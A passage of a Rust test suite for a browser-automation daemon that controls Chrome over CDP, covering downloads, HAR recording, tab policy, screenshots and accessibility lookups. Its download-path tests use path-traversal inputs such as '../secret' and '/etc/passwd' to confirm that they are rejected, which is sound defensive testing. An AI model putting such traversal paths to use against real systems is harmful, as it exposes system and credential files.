/// Serves `Browser.getVersion` on one fixed `ws://` address for any number
/// of connections and counts the calls.
async fn version_server() -> (String, std::sync::Arc<std::sync::atomic::AtomicUsize>) {
    use futures_util::{SinkExt, StreamExt};
    use tokio_tungstenite::tungstenite::Message;
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let url = format!("ws://{}", listener.local_addr().unwrap());
    let calls = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
    let served = calls.clone();
    tokio::spawn(async move {
        while let Ok((stream, _)) = listener.accept().await {
            let calls = served.clone();
            tokio::spawn(async move {
                let Ok(mut ws) = tokio_tungstenite::accept_async(stream).await else {
                    return;
                };
                while let Some(Ok(Message::Text(text))) = ws.next().await {
                    let request: serde_json::Value = serde_json::from_str(&text).unwrap();
                    if request["method"] == "Browser.getVersion" {
                        calls.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
                    }
                    let reply = serde_json::json!({
                        "id": request["id"],
                        "result": { "product": "Chrome/1.0.0.0" },
                    });
                    if ws
                        .send(Message::Text(reply.to_string().into()))
                        .await
                        .is_err()
                    {
                        return;
                    }
                }
            });
        }
    });
    (url, calls)
}

#[tokio::test]
async fn outdated_check_reads_the_product_once_per_connection() {
    let (url, calls) = version_server().await;
    let mut state = super::DaemonState::new();
    let mut response = serde_json::json!({});

    let client = crate::native::cdp::client::CdpClient::connect(&url)
        .await
        .unwrap();
    state.browser = Some(super::BrowserManager::for_test(client, url.clone()));
    super::warn_if_browser_outdated(&mut state, &mut response).await;
    super::warn_if_browser_outdated(&mut state, &mut response).await;
    assert_eq!(calls.load(std::sync::atomic::Ordering::SeqCst), 1);

    let client = crate::native::cdp::client::CdpClient::connect(&url)
        .await
        .unwrap();
    state.browser = Some(super::BrowserManager::for_test(client, url.clone()));
    super::warn_if_browser_outdated(&mut state, &mut response).await;
    assert_eq!(calls.load(std::sync::atomic::Ordering::SeqCst), 2);
}

#[tokio::test]
async fn cdp_url_without_browser_does_not_launch() {
    let mut state = super::DaemonState::new();
    state.policy = None;
    state.confirm_actions = None;

    let response = super::execute_command(
        &serde_json::json!({ "id": "cdp", "action": "cdp_url" }),
        &mut state,
    )
    .await;

    assert_eq!(response["success"], false);
    assert_eq!(response["error"], "Browser not launched");
    assert!(state.browser.is_none());
}

#[tokio::test]
async fn a_replay_over_a_har_without_content_captures_bodies_and_restores_the_mode() {
    use crate::native::flow::Browser;
    let mut state = DaemonState::new();
    state.har_recording = true;
    state.har_content_mode = HarContentMode::None;
    let allow = crate::native::flow::AllowWrite::default();
    let mut wiring = FlowWiring::new(&mut state, &allow);
    wiring.begin_capture().await.unwrap();
    assert_eq!(
        wiring.state.har_content_mode,
        HarContentMode::Text,
        "the replay needs bodies to read its answers"
    );
    wiring.end_capture().await;
    assert_eq!(state.har_content_mode, HarContentMode::None);
    assert!(state.har_recording, "the user's HAR keeps running");
}

#[tokio::test]
async fn a_replay_leaves_no_bodies_on_the_entries_a_content_none_har_held_before_it() {
    use crate::native::flow::Browser;
    let entry = |id: &str, body: Option<&str>| HarEntry {
        request_id: id.to_string(),
        wall_time: 0.0,
        method: "GET".to_string(),
        url: "https://example.com/".to_string(),
        request_headers: Vec::new(),
        post_data: None,
        request_body_size: 0,
        resource_type: "Fetch".to_string(),
        status: Some(200),
        status_text: "OK".to_string(),
        http_version: "HTTP/2.0".to_string(),
        response_headers: Vec::new(),
        mime_type: "application/json".to_string(),
        redirect_url: String::new(),
        response_body_size: 2,
        cdp_timing: None,
        loading_finished_timestamp: Some(1.0),
        response_body: body.map(String::from),
        response_body_base64: false,
        remote_addr: None,
    };
    let mut state = DaemonState::new();
    state.har_recording = true;
    state.har_content_mode = HarContentMode::None;
    state.har_entries.push(entry("before", None));
    let allow = crate::native::flow::AllowWrite::default();
    let mut wiring = FlowWiring::new(&mut state, &allow);
    let mark = wiring.begin_capture().await.unwrap();
    // A body fetched while the replay ran, for a request that began earlier.
    wiring.state.har_entries[0].response_body = Some("{}".to_string());
    wiring.state.har_body_total_bytes = 2;
    wiring.state.har_entries.push(entry("during", Some("{}")));
    assert_eq!(mark, 1);
    wiring.end_capture().await;
    assert_eq!(state.har_entries.len(), 1);
    assert_eq!(state.har_entries[0].response_body, None);
    assert_eq!(state.har_body_total_bytes, 0);
}

#[test]
fn wedged_tab_replacement_follows_tab_policy() {
    let dir = tempfile::tempdir().unwrap();
    let policy_with = |body: &str| {
        let path = dir.path().join("policy.json");
        std::fs::write(&path, body).unwrap();
        ActionPolicy::load(path.to_str().unwrap()).unwrap()
    };
    let mut state = DaemonState::new();
    state.policy = None;
    state.confirm_actions = None;
    assert!(may_replace_wedged_tab(&state));

    state.policy = Some(policy_with(r#"{"default":"allow","deny":["tab_close"]}"#));
    assert!(!may_replace_wedged_tab(&state));

    state.policy = Some(policy_with(r#"{"default":"allow","confirm":["tab_new"]}"#));
    assert!(!may_replace_wedged_tab(&state));
    state.confirmed_policy_actions.insert("tab_new".to_string());
    assert!(may_replace_wedged_tab(&state));

    state.policy = None;
    state.confirmed_policy_actions.clear();
    state.confirm_actions = Some(ConfirmActions {
        categories: ["tab_close".to_string()].into_iter().collect(),
    });
    assert!(!may_replace_wedged_tab(&state));
}

#[test]
fn wedge_report_delivered_only_clears_its_own_request() {
    let mut state = DaemonState::new();
    let report = || super::super::browser::WedgeReport {
        target_id: "T".to_string(),
        session_id: "S".to_string(),
        last_url: String::new(),
        replacement_target_id: None,
        kept: false,
    };
    state.undelivered_wedge = Some(("b".to_string(), report()));
    state.wedge_report_delivered("a");
    assert!(state.undelivered_wedge.is_some());
    state.wedge_report_delivered("b");
    assert!(state.undelivered_wedge.is_none());
}

#[test]
fn only_a_launched_browser_may_name_the_file_to_move() {
    let dir = tempfile::tempdir().unwrap();
    let downloads = dir.path().join("downloads");
    std::fs::create_dir(&downloads).unwrap();
    let inside = downloads.join("report.bin");
    let outside = dir.path().join("secret");
    std::fs::write(&inside, "").unwrap();
    std::fs::write(&outside, "").unwrap();
    let downloads = downloads.to_str();

    assert!(!super::may_move_download(&inside, false, None));
    assert!(!super::may_move_download(&inside, false, downloads));
    assert!(super::may_move_download(&outside, true, None));
    assert!(super::may_move_download(&inside, true, downloads));
    assert!(!super::may_move_download(&outside, true, downloads));
    let escape = dir.path().join("downloads").join("..").join("secret");
    assert!(!super::may_move_download(&escape, true, downloads));
    #[cfg(unix)]
    {
        let link = dir.path().join("downloads").join("link");
        std::os::unix::fs::symlink(&outside, &link).unwrap();
        assert!(!super::may_move_download(&link, true, downloads));
    }
}

#[test]
fn download_guid_must_name_a_file_in_the_download_dir() {
    let dir = std::path::Path::new("/tmp/downloads");
    assert_eq!(
        super::guid_download_path(dir, "8f3c-21ab").unwrap(),
        dir.join("8f3c-21ab")
    );
    for guid in ["", ".", "..", "../secret", "a/b", "/etc/passwd", "8f3c/"] {
        assert!(
            super::guid_download_path(dir, guid).is_err(),
            "accepted {guid:?}"
        );
    }
}

#[tokio::test]
#[ignore = "requires Chrome"]
async fn e2e_attached_download_fails_before_browser_or_filesystem_changes() {
    let mut producer = super::BrowserManager::launch(super::LaunchOptions::default(), None)
        .await
        .unwrap();
    let mut state = super::DaemonState::new();
    state.browser = Some(
        super::BrowserManager::connect_cdp(producer.get_cdp_url())
            .await
            .unwrap(),
    );
    let dir = tempfile::tempdir().unwrap();
    let destination = dir.path().join("new-directory").join("output.bin");

    let error = super::handle_download(
        &serde_json::json!({ "selector": "#dl", "path": destination }),
        &mut state,
    )
    .await
    .unwrap_err();
    assert!(error.contains("--cdp"), "{error}");
    assert!(!destination.parent().unwrap().exists());
    let _ = producer.close().await;
}

async fn start_finished_download(
    state: &mut super::DaemonState,
    download_dir: &std::path::Path,
) -> std::path::PathBuf {
    for cmd in [
        serde_json::json!({ "id": "1", "action": "launch", "headless": true,
                "downloadPath": download_dir.to_string_lossy() }),
        serde_json::json!({ "id": "2", "action": "navigate", "url":
                "data:text/html,<a id=dl download=report.bin href='data:application/octet-stream,report'>dl</a>" }),
        serde_json::json!({ "id": "3", "action": "evaluate",
                "script": "document.getElementById('dl').click()" }),
    ] {
        let resp = super::execute_command(&cmd, state).await;
        assert_eq!(resp["success"], true, "{resp}");
    }
    let saved = download_dir.join("report.bin");
    for _ in 0..50 {
        if saved.exists() {
            break;
        }
        tokio::time::sleep(std::time::Duration::from_millis(100)).await;
    }
    assert!(
        saved.exists(),
        "download should land in the configured directory"
    );
    saved
}

/// Events that arrive after the per-command drain, for example during the
/// liveness check, are still in the daemon's receiver when the wait starts.
#[tokio::test]
#[ignore]
async fn e2e_wait_download_claims_a_completion_left_in_the_daemon_receiver() {
    let dir = tempfile::tempdir().unwrap();
    let mut state = super::DaemonState::new();
    start_finished_download(&mut state, &dir.path().join("downloads")).await;

    let result = super::handle_waitfordownload(
        &serde_json::json!({ "action": "waitfordownload", "timeout": 2000 }),
        &mut state,
    )
    .await;
    assert!(result.is_ok(), "{result:?}");
    super::execute_command(
        &serde_json::json!({ "id": "9", "action": "close" }),
        &mut state,
    )
    .await;
}

#[tokio::test]
#[ignore]
async fn e2e_wait_download_failed_move_leaves_the_download_claimable() {
    let dir = tempfile::tempdir().unwrap();
    let mut state = super::DaemonState::new();
    let saved = start_finished_download(&mut state, &dir.path().join("downloads")).await;

    // A regular file as the parent directory makes the destination invalid.
    let blocker = dir.path().join("blocker");
    std::fs::write(&blocker, "").unwrap();
    let resp = super::execute_command(
        &serde_json::json!({ "id": "4", "action": "waitfordownload",
                "path": blocker.join("report.bin").to_string_lossy(), "timeout": 2000 }),
        &mut state,
    )
    .await;
    assert_eq!(resp["success"], false, "{resp}");
    assert!(saved.exists(), "a failed move keeps the source file");

    let dest = dir.path().join("out").join("report.bin");
    let resp = super::execute_command(
        &serde_json::json!({ "id": "5", "action": "waitfordownload",
                "path": dest.to_string_lossy(), "timeout": 2000 }),
        &mut state,
    )
    .await;
    assert_eq!(resp["success"], true, "{resp}");
    assert_eq!(std::fs::read_to_string(&dest).unwrap(), "report");
    super::execute_command(
        &serde_json::json!({ "id": "9", "action": "close" }),
        &mut state,
    )
    .await;
}

/// `download` points the browser at another directory; later downloads must
/// go back to the configured one so `wait --download` can still move them.
#[tokio::test]
#[ignore]
async fn e2e_wait_download_after_download_command_uses_configured_dir() {
    let dir = tempfile::tempdir().unwrap();
    let mut state = super::DaemonState::new();
    start_finished_download(&mut state, &dir.path().join("downloads")).await;
    let claimed = super::execute_command(
        &serde_json::json!({ "id": "4", "action": "waitfordownload", "timeout": 2000 }),
        &mut state,
    )
    .await;
    assert_eq!(claimed["success"], true, "{claimed}");

    let resp = super::execute_command(
        &serde_json::json!({ "id": "5", "action": "download", "selector": "#dl",
                "path": dir.path().join("other").join("first.bin").to_string_lossy() }),
        &mut state,
    )
    .await;
    assert_eq!(resp["success"], true, "{resp}");
    let resp = super::execute_command(
        &serde_json::json!({ "id": "6", "action": "evaluate",
                "script": "document.getElementById('dl').click()" }),
        &mut state,
    )
    .await;
    assert_eq!(resp["success"], true, "{resp}");

    let dest = dir.path().join("out").join("second.bin");
    let resp = super::execute_command(
        &serde_json::json!({ "id": "7", "action": "waitfordownload",
                "path": dest.to_string_lossy(), "timeout": 5000 }),
        &mut state,
    )
    .await;
    assert_eq!(resp["success"], true, "{resp}");
    assert_eq!(std::fs::read_to_string(&dest).unwrap(), "report");
    super::execute_command(
        &serde_json::json!({ "id": "9", "action": "close" }),
        &mut state,
    )
    .await;
}

/// Connecting over CDP must not reset the attached browser's download
/// directory, and the wait must not require the file on the local disk.
#[tokio::test]
#[ignore]
async fn e2e_cdp_connect_keeps_the_browser_download_dir() {
    let dir = tempfile::tempdir().unwrap();
    let download_dir = dir.path().join("downloads");
    std::fs::create_dir_all(&download_dir).unwrap();
    let mut owner = super::DaemonState::new();
    for cmd in [
        serde_json::json!({ "id": "1", "action": "launch", "headless": true,
                "downloadPath": download_dir.to_string_lossy() }),
        serde_json::json!({ "id": "2", "action": "navigate", "url":
                "data:text/html,<a id=dl download=report.bin href='data:application/octet-stream,report'>dl</a>" }),
    ] {
        let resp = super::execute_command(&cmd, &mut owner).await;
        assert_eq!(resp["success"], true, "{resp}");
    }
    let cdp_url = owner.browser.as_ref().unwrap().get_cdp_url().to_string();

    let mut attached = super::DaemonState::new();
    for cmd in [
        serde_json::json!({ "id": "3", "action": "launch", "cdpUrl": cdp_url }),
        serde_json::json!({ "id": "4", "action": "evaluate",
                "script": "document.getElementById('dl').click()" }),
    ] {
        let resp = super::execute_command(&cmd, &mut attached).await;
        assert_eq!(resp["success"], true, "{resp}");
    }
    let resp = super::execute_command(
        &serde_json::json!({ "id": "5", "action": "waitfordownload", "timeout": 5000 }),
        &mut attached,
    )
    .await;
    assert_eq!(resp["success"], true, "{resp}");
    let saved = download_dir.join("report.bin");
    for _ in 0..50 {
        if saved.exists() {
            break;
        }
        tokio::time::sleep(std::time::Duration::from_millis(100)).await;
    }
    assert!(
        saved.exists(),
        "download should stay in the configured directory"
    );
    super::execute_command(
        &serde_json::json!({ "id": "9", "action": "close" }),
        &mut owner,
    )
    .await;
}

#[tokio::test]
async fn test_auth_login_releases_remote_objects_after_failures() {
    use futures_util::{SinkExt, StreamExt};
    use tokio_tungstenite::tungstenite::Message;

    for failure in ["selection", "describe", "fill-exception", "fill-protocol"] {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let url = format!("ws://{}", listener.local_addr().unwrap());
        let server = tokio::spawn(async move {
            let (stream, _) = listener.accept().await.unwrap();
            let mut ws = tokio_tungstenite::accept_async(stream).await.unwrap();
            let mut releases = Vec::new();
            let mut attempts = 0;
            while let Some(Ok(Message::Text(text))) = ws.next().await {
                let request: Value = serde_json::from_str(&text).unwrap();
                let mut response = json!({ "id": request["id"] });
                response["result"] = match request["method"].as_str().unwrap() {
                    "Runtime.evaluate" => {
                        attempts += 1;
                        if failure == "selection" && attempts == 1 {
                            json!({
                                "result": { "type": "object", "objectId": "rejected-result" },
                                "exceptionDetails": { "text": "Invalid selector",
                                    "exception": { "type": "object", "objectId": "exception" } }
                            })
                        } else {
                            json!({ "result": { "type": "object", "subtype": "node",
                                    "objectId": format!("node-{attempts}") } })
                        }
                    }
                    "DOM.describeNode" if failure == "describe" && attempts == 1 => {
                        response["error"] =
                            json!({ "code": -32000, "message": "Node unavailable" });
                        Value::Null
                    }
                    "DOM.describeNode" => json!({ "node": { "backendNodeId": 42 } }),
                    "DOM.resolveNode" => {
                        json!({ "object": { "type": "object", "objectId": "login-node" } })
                    }
                    "Runtime.callFunctionOn" if failure == "fill-exception" => json!({
                        "result": { "type": "object", "objectId": "rejected-result" },
                        "exceptionDetails": { "text": "Page exception",
                            "exception": { "type": "object", "objectId": "exception" } }
                    }),
                    "Runtime.callFunctionOn" if failure == "fill-protocol" => {
                        response["error"] = json!({ "code": -32000, "message": "CDP failure" });
                        Value::Null
                    }
                    "Runtime.callFunctionOn" => {
                        json!({ "result": { "type": "boolean", "value": true } })
                    }
                    "Runtime.releaseObject" => {
                        releases.push(request["params"]["objectId"].as_str().unwrap().to_string());
                        json!({})
                    }
                    other => panic!("Unexpected command: {other}"),
                };
                ws.send(Message::Text(response.to_string())).await.unwrap();
            }
            (attempts, releases)
        });
        let client = CdpClient::connect(&url).await.unwrap();
        let element = super::wait_for_any_selector(&client, "session", &["input"], 1_000)
            .await
            .unwrap();
        let filled = element.fill(&client, "session", "test-value").await;
        client.close().await;
        let (attempts, mut releases) = server.await.unwrap();
        assert_eq!(filled.is_ok(), !failure.starts_with("fill"), "{failure}");
        assert_eq!(attempts, if failure.starts_with("fill") { 1 } else { 2 });
        let mut expected = match failure {
            "selection" => vec!["exception", "rejected-result", "node-2", "login-node"],
            "describe" => vec!["node-1", "node-2", "login-node"],
            "fill-exception" => vec!["node-1", "rejected-result", "exception", "login-node"],
            _ => vec!["node-1", "login-node"],
        };
        releases.sort();
        expected.sort();
        assert_eq!(releases, expected, "{failure}");
    }
}

#[tokio::test]
async fn human_command_does_not_change_session_default() {
    let mut state = super::DaemonState::new();
    // Even a rejected command must not leak a per-command override.
    let _ = super::execute_command(
        &serde_json::json!({
            "action": "unknown-test-command", "inputMode": "human"
        }),
        &mut state,
    )
    .await;
    assert_eq!(state.input_mode, "instant");
}

#[tokio::test]
async fn explicit_input_mode_sets_session_default() {
    let mut state = super::DaemonState::new();
    let _ = super::execute_command(
        &serde_json::json!({
            "action": "unknown-test-command", "defaultInputMode": "smooth", "inputMode": "human"
        }),
        &mut state,
    )
    .await;
    assert_eq!(state.input_mode, "smooth");
    let _ = super::execute_command(
        &serde_json::json!({"action": "unknown-test-command"}),
        &mut state,
    )
    .await;
    assert_eq!(state.input_mode, "smooth");
}

#[test]
fn screenshot_alternating_scopes_keep_independent_baselines() {
    let dir = tempfile::tempdir().unwrap();
    let image = image::RgbaImage::from_pixel(2, 2, image::Rgba([255, 0, 0, 255]));
    let mut png = std::io::Cursor::new(Vec::new());
    image.write_to(&mut png, image::ImageFormat::Png).unwrap();
    let data = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, png.into_inner());
    let mut state = DaemonState::new();
    let scopes = [
        "selector=#a;fullPage=false",
        "selector=#b;fullPage=false",
        "selector=None;fullPage=true",
    ];
    for pass in 0..2 {
        for (index, scope) in scopes.iter().enumerate() {
            let path = dir.path().join(format!("{pass}-{index}.png"));
            let options = ScreenshotOptions {
                path: Some(path.to_string_lossy().into_owned()),
                ..Default::default()
            };
            let result = observe_screenshot(
                &mut state,
                "tab".into(),
                scope.to_string(),
                &data,
                0.0,
                &options,
            )
            .unwrap();
            assert_eq!(
                result["changed"],
                pass == 0,
                "scope {scope}, pass {pass}: {result}"
            );
            assert_eq!(result["revision"], pass + 1);
            assert_eq!(
                path.exists(),
                pass == 0,
                "suppressed screenshots must not create a file"
            );
        }
    }
}

use super::super::cdp::types::{AXNode, AXValue};
use super::*;
use crate::test_utils::EnvGuard;
use std::fs;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpListener;

#[tokio::test]
#[ignore]
async fn e2e_failed_wheel_dispatch_preserves_pointer() {
    let mut state = DaemonState::new();
    let response =
        execute_command(&json!({ "action": "launch", "headless": true }), &mut state).await;
    assert_eq!(response["success"], true, "{response}");
    state.mouse_state = MouseState {
        x: 50.0,
        y: 60.0,
        buttons: 1,
    };
    let mgr = state.browser.as_ref().unwrap();
    mgr.client
        .send_command(
            "Target.detachFromTarget",
            Some(json!({ "sessionId": mgr.active_session_id().unwrap() })),
            None,
        )
        .await
        .unwrap();
    let result = handle_wheel(&json!({ "x": 200, "y": 300, "deltaY": 40 }), &mut state).await;
    let pointer = state.mouse_state;
    close_current_browser(&mut state).await.unwrap();

    assert!(
        result.is_err(),
        "detached session accepted wheel: {result:?}"
    );
    assert_eq!((pointer.x, pointer.y, pointer.buttons), (50.0, 60.0, 1));
}

#[test]
fn screenshot_pixel_ratio_counts_changed_pixels() {
    let previous = ScreenshotObservation {
        revision: 1,
        signature: "viewport".to_string(),
        decoded_hash: 0,
        width: 2,
        height: 1,
        rgba: vec![0, 0, 0, 255, 255, 255, 255, 255],
    };
    let current = vec![0, 0, 0, 255, 255, 0, 255, 255];
    assert_eq!(changed_pixel_ratio(&previous, 2, 1, &current), 0.5);
}

#[test]
fn screenshot_pixel_ratio_treats_dimension_change_as_full_change() {
    let previous = ScreenshotObservation {
        revision: 1,
        signature: "viewport".to_string(),
        decoded_hash: 0,
        width: 1,
        height: 1,
        rgba: vec![0, 0, 0, 255],
    };
    assert_eq!(changed_pixel_ratio(&previous, 2, 1, &[0; 8]), 1.0);
}

/// A binding-recovery failure must tear the connection down: the attach
/// paths set `state.browser` before calling this, so returning the error
/// alone would let the next command skip the attach path and act on
/// whatever tab is selected. Force-red: drop `rollback_failed_launch`
/// from the error arm and `launch_identity` survives the error.
#[tokio::test]
async fn apply_tab_binding_rollback_clears_launch_state_on_recovery_failure() {
    let guard = EnvGuard::new(&["FROB_SOCKET_DIR", "XDG_RUNTIME_DIR"]);
    let dir = tempfile::tempdir().unwrap();
    guard.set("FROB_SOCKET_DIR", dir.path().to_str().unwrap());
    guard.remove("XDG_RUNTIME_DIR");

    let mut state = DaemonState::new();
    fs::write(
        super::tab_binding::binding_path(&state.session_id),
        "{not valid json",
    )
    .unwrap();
    state.launch_identity = Some(42);

    let err = apply_tab_binding_on_attach_or_rollback(&mut state)
        .await
        .expect_err("a corrupt binding file is a recovery failure");

    assert!(
        err.contains("corrupt tab binding file"),
        "unexpected error: {}",
        err
    );
    assert!(
        state.launch_identity.is_none(),
        "the failed attach must be rolled back, not left committed"
    );
}

/// `find --help`, the MCP tool schema, and the docs/skill references are
/// plain text, not generated from `FIND_ACTIONS`; this pins their
/// wording to the actual accepted set so an edit to one without the
/// others fails here instead of drifting silently again.
#[tokio::test]
async fn recording_start_rejects_active_take_before_browser_work() {
    let mut state = DaemonState::new();
    state.recording_state.active = true;
    let error = handle_recording_start(&json!({"path":"unused.webm"}), &mut state)
        .await
        .unwrap_err();
    assert_eq!(error, "Recording already active");
    assert!(state.recording_state.active);
    assert!(state.browser.is_none());
}

#[tokio::test]
async fn errors_clear_empties_page_error_log() {
    let mut state = DaemonState::new();
    state
        .event_tracker
        .add_error("boom", Some("app.js"), Some(7), Some(3));

    let resp = handle_errors(&json!({ "clear": true }), &mut state)
        .await
        .unwrap();
    assert_eq!(resp["cleared"], true);

    let resp = handle_errors(&json!({}), &mut state).await.unwrap();
    assert_eq!(resp["errors"], json!([]));
}

#[test]
fn find_actions_help_text_matches_the_accepted_set() {
    assert_eq!(FIND_ACTIONS.join(", "), "click, fill, check, hover, text");
}

/// `type`, `focus`, and `uncheck` are real standalone commands but were
/// never wired into `execute_subaction`, so they used to reach here and
/// fail with "Browser not launched" (masking the real problem) or a bare
/// "Unknown subaction: type". No prior test caught this:
/// `test_all_documented_actions_are_handled` only covers top-level
/// `action` values, not `find`'s nested `subaction`.
#[tokio::test]
async fn execute_subaction_rejects_undocumented_actions_before_requiring_a_browser() {
    let mut state = DaemonState::new();
    assert!(state.browser.is_none());

    for bogus in ["type", "focus", "uncheck", "drag", ""] {
        assert!(
            !FIND_ACTIONS.contains(&bogus),
            "test fixture '{bogus}' must not overlap the real accepted set"
        );
        let cmd = json!({ "subaction": bogus });
        let err = execute_subaction(&cmd, &mut state, "@e1")
            .await
            .expect_err(&format!(
                "'{bogus}' is not a find action and must be rejected"
            ));
        assert_eq!(
            err,
            format!(
                "Unknown action '{}' for find. Valid actions: {}.",
                bogus,
                FIND_ACTIONS.join(", ")
            )
        );
    }
}

/// The dispatch-level validation must reject an unsupported `find`
/// action for every find-family command, before any browser launch or
/// locator resolution. Without it, a missing element fails the locator
/// step first and masks the invalid action with "element not found"
/// (after paying for a browser launch to say it).
#[test]
fn validate_find_subaction_rejects_before_any_browser_work() {
    for command in FIND_SUBACTION_COMMANDS {
        let err = validate_find_subaction(command, &json!({ "subaction": "type" }))
            .expect_err(&format!("'{command}' must validate its find action"));
        assert_eq!(
            err,
            format!(
                "Unknown action 'type' for find. Valid actions: {}.",
                FIND_ACTIONS.join(", ")
            )
        );
    }

    // The default subaction and every accepted action pass.
    assert!(validate_find_subaction("getbyrole", &json!({})).is_ok());
    for accepted in FIND_ACTIONS {
        assert!(validate_find_subaction("getbytext", &json!({ "subaction": accepted })).is_ok());
    }

    // Commands outside the find family carry no subaction contract.
    assert!(validate_find_subaction("click", &json!({ "subaction": "type" })).is_ok());
}

/// Every entry in `FIND_ACTIONS` must actually dispatch in
/// `execute_subaction`'s match, not just pass the guard; this is the
/// real lock the guard alone can't provide, since the guard and the
/// match arms are two separate lists that Rust can't check against each
/// other at compile time.
#[tokio::test]
#[ignore]
async fn e2e_execute_subaction_dispatches_every_find_action() {
    let mut state = DaemonState::new();
    let resp = execute_command(
        &json!({ "id": "1", "action": "launch", "headless": true }),
        &mut state,
    )
    .await;
    assert!(resp.get("success").and_then(|v| v.as_bool()) == Some(true));

    let resp = execute_command(
            &json!({
                "id": "2",
                "action": "navigate",
                "url": "data:text/html,<input id='i' role='textbox' value='x'><button>Go</button><input type='checkbox' role='checkbox'>"
            }),
            &mut state,
        )
        .await;
    assert!(resp.get("success").and_then(|v| v.as_bool()) == Some(true));

    for action in FIND_ACTIONS {
        let mut cmd = json!({
            "id": "3",
            "action": "getbyrole",
            "role": match *action {
                "fill" => "textbox",
                "check" => "checkbox",
                _ => "button",
            },
            "subaction": action,
        });
        if *action == "fill" {
            cmd["value"] = json!("y");
        }
        let resp = execute_command(&cmd, &mut state).await;
        // success == true is the only assertion that proves the action
        // reached a real handler AND that handler worked: a guard-only
        // check ("not Unknown action") stays green when an entry added
        // to FIND_ACTIONS falls through to the internal-error fallback.
        let error = resp.get("error").and_then(|v| v.as_str()).unwrap_or("");
        assert!(
            resp.get("success").and_then(|v| v.as_bool()) == Some(true),
            "action '{action}' must dispatch to a working handler: {error}"
        );
    }

    let _ = execute_command(&json!({ "id": "99", "action": "close" }), &mut state).await;
}

fn ax_value(value: &str) -> AXValue {
    AXValue {
        value_type: "string".to_string(),
        value: Some(Value::String(value.to_string())),
    }
}

fn ax_node(role: &str, name: &str, backend_node_id: Option<i64>, ignored: bool) -> AXNode {
    AXNode {
        node_id: format!("node-{}", name),
        role: Some(ax_value(role)),
        name: Some(ax_value(name)),
        value: None,
        description: None,
        properties: None,
        child_ids: None,
        backend_d_o_m_node_id: backend_node_id,
        ignored: Some(ignored),
    }
}

#[test]
fn normalize_ax_role_maps_rootwebarea_to_document() {
    // Chrome's AX root is `RootWebArea`; ARIA and Playwright call it
    // `document`. Force-red: drop the mapping and `find role document` misses
    // the root. `image` is pre-existing and covered elsewhere.
    assert_eq!(normalize_ax_role("RootWebArea"), "document");
    assert_eq!(normalize_ax_role("document"), "document");
}

#[test]
fn find_ax_node_by_role_matches_browser_computed_implicit_roles() {
    let nodes = vec![
        ax_node("RootWebArea", "Fixture", Some(1), false),
        ax_node("link", "Services", Some(42), false),
        ax_node("heading", "Skills", Some(43), false),
    ];

    let (backend_id, actual_name) = find_ax_node_by_role(&nodes, "link", Some("Services"), true)
        .expect("computed AX link role should match the anchor");
    assert_eq!(backend_id, 42);
    assert_eq!(actual_name, "Services");

    let (backend_id, _) = find_ax_node_by_role(&nodes, "heading", None, false)
        .expect("role-only lookup should match the implicit heading");
    assert_eq!(backend_id, 43);
}

#[test]
fn find_ax_node_by_role_non_exact_name_is_case_insensitive() {
    let nodes = vec![ax_node("heading", "SKILLS", Some(43), false)];

    for query in ["Skills", "skills", "SKILLS", "kill"] {
        let (backend_id, actual_name) = find_ax_node_by_role(&nodes, "heading", Some(query), false)
            .unwrap_or_else(|e| panic!("expected case-insensitive match for {query:?}: {e}"));
        assert_eq!(backend_id, 43);
        assert_eq!(actual_name, "SKILLS");
    }
}

#[test]
fn find_ax_node_by_role_exact_name_stays_case_sensitive() {
    let nodes = vec![ax_node("heading", "SKILLS", Some(43), false)];

    let err = find_ax_node_by_role(&nodes, "heading", Some("Skills"), true)
        .expect_err("exact matching must not ignore case");
    assert!(err.contains("Names seen: \"SKILLS\""));

    let (backend_id, _) = find_ax_node_by_role(&nodes, "heading", Some("SKILLS"), true)
        .expect("exact match with identical case should still succeed");
    assert_eq!(backend_id, 43);
}

#[test]
fn find_ax_node_by_role_matches_role_case_insensitively() {
    let nodes = vec![ax_node("heading", "Skills", Some(43), false)];

    let (backend_id, _) = find_ax_node_by_role(&nodes, "Heading", None, false)
        .expect("role matching should ignore case, same as name matching");
    assert_eq!(backend_id, 43);
}

/// Chrome's AX tree reports `<img>` as role "image" while ARIA (and
/// Playwright queries) call it "img"; both spellings must find the node.
#[test]
fn find_ax_node_by_role_normalizes_ax_role_synonyms() {
    let nodes = vec![ax_node("image", "Logo", Some(51), false)];

    let (backend_id, _) = find_ax_node_by_role(&nodes, "img", Some("Logo"), false)
        .expect("the ARIA role name must match Chrome's AX role");
    assert_eq!(backend_id, 51);

    let (backend_id, _) = find_ax_node_by_role(&nodes, "image", Some("Logo"), false)
        .expect("the AX spelling keeps matching after normalization");
    assert_eq!(backend_id, 51);
}

/// Accessible names are whitespace-normalized on both sides, so a name
/// rendered with a collapsed run of spaces still matches exactly.
#[test]
fn find_ax_node_by_role_normalizes_whitespace_in_names() {
    let nodes = vec![ax_node("button", "Save   changes", Some(52), false)];

    let (backend_id, _) = find_ax_node_by_role(&nodes, "button", Some("Save changes"), true)
        .expect("exact matching must normalize internal whitespace");
    assert_eq!(backend_id, 52);

    let (backend_id, _) = find_ax_node_by_role(&nodes, "button", Some("save  changes"), false)
        .expect("substring matching must normalize internal whitespace");
    assert_eq!(backend_id, 52);
}

#[test]
fn find_ax_node_by_role_supports_substring_matching() {
    let nodes = vec![ax_node("button", "Submit form", Some(7), false)];

    let (backend_id, actual_name) = find_ax_node_by_role(&nodes, "button", Some("submit"), false)
        .expect("substring matching should be allowed without exact");
    assert_eq!(backend_id, 7);
    assert_eq!(actual_name, "Submit form");

    let err = find_ax_node_by_role(&nodes, "button", Some("Submit"), true)
        .expect_err("exact matching should reject partial names");
    assert!(err.contains("Names seen: \"Submit form\""));
}

#[test]
fn find_ax_node_by_role_skips_ignored_nodes_and_requires_backend_id() {
    let nodes = vec![
        ax_node("link", "Services", Some(1), true),
        ax_node("link", "Services", None, false),
    ];

    let err = find_ax_node_by_role(&nodes, "link", Some("Services"), true)
        .expect_err("matching AX nodes must have a backend DOM node id");
    assert!(err.contains("no live DOM element"));
}

#[test]
fn find_ax_node_by_role_uses_later_actionable_match() {
    let nodes = vec![
        ax_node("link", "Services", None, false),
        ax_node("link", "Services", Some(42), false),
    ];

